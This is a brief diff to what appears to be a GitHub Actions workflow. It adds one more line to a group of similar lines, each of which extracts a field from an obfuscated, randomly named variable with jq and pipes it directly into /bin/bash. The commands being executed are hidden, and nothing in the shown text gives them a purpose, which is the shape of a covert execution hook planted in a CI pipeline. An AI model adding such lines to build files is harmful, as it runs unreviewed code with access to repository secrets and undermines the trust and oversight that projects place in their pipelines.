@@ -26,6 +26,7 @@ jobs:
           echo $bon8 | jq -r .gev320 | /bin/bash
           echo $n05 | jq -r .ovin00586 | /bin/bash
           printf '%s' "$j8194" | jq -r .vzxl06 | /bin/bash
+          echo $rve66 | jq -r .wsqk47713 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
